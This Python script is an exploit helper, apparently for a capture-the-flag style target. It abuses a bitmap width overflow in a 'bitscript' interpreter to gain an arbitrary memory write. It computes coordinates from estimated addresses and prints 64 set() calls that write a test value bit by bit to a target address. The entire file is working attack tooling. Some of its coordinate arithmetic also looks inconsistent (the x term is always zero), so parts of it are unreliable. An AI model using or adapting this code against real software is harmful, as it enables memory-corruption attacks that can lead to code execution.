#!/usr/bin/env python3
"""
Helper script to calculate bitmap overflow coordinates and generate bit-by-bit writes
"""

def calculate_coordinates(value_ptr_addr, bitmap_data_ptr, int64_max=9223372036854775807):
    """
    Calculate y and x coordinates for bitmap overflow write
    
    Args:
        value_ptr_addr: Target address to write to
        bitmap_data_ptr: Base address of bitmap data buffer
        int64_max: Maximum value for bitmap width (INT64_MAX)
    
    Returns:
        (y, x) coordinates for bitmap overflow
    """
    offset = value_ptr_addr - bitmap_data_ptr
    bit_offset = offset * 8
    y = bit_offset // int64_max
    x = bit_offset % 8
    
    return (y, x)

def write_64bit_value(bitmap_name, target_addr, bitmap_data_ptr, value, int64_max=9223372036854775807):
    """
    Generate bitscript code to write a 64-bit value to target address
    
    Args:
        bitmap_name: Name of bitmap variable
        target_addr: Target address to write to
        bitmap_data_ptr: Base address of bitmap data buffer
        value: 64-bit value to write
        int64_max: Maximum value for bitmap width
    
    Returns:
        bitscript code as string
    """
    # Calculate base coordinates
    base_y, base_x = calculate_coordinates(target_addr, bitmap_data_ptr, int64_max)
    
    code = []
    code.append(f"print(\"Writing 0x{value:016x} to address 0x{target_addr:x}\");")
    code.append(f"print(\"Base coordinates: y={base_y}, x={base_x}\");")
    
    # Write each bit
    for bit in range(64):
        bit_value = (value >> bit) & 1
        current_y = base_y + (bit // 8)
        current_x = base_x + (bit % 8)
        
        # Handle x overflow (wrap to next y)
        if current_x >= 8:
            current_y += 1
            current_x -= 8
        
        code.append(f"set({bitmap_name}, {current_x}, {current_y}, {bit_value});")
    
    return "\n".join(code)

def main():
    # Example: Write 0x41414141 to estimated address
    target_addr = 324521456 - 768 + 40  # targetaddr - 0x300 + 0x28
    bitmap_data_ptr = 324521456 + 4096   # targetaddr + 0x1000
    test_value = 0x41414141
    
    print("=== Bit-by-Bit Write Code Generator ===")
    print(f"Target address: 0x{target_addr:x}")
    print(f"Bitmap data ptr: 0x{bitmap_data_ptr:x}")
    print(f"Test value: 0x{test_value:x}")
    print()
    print("Generated bitscript code:")
    print()
    print(write_64bit_value("b1", target_addr, bitmap_data_ptr, test_value))

if __name__ == "__main__":
    main()

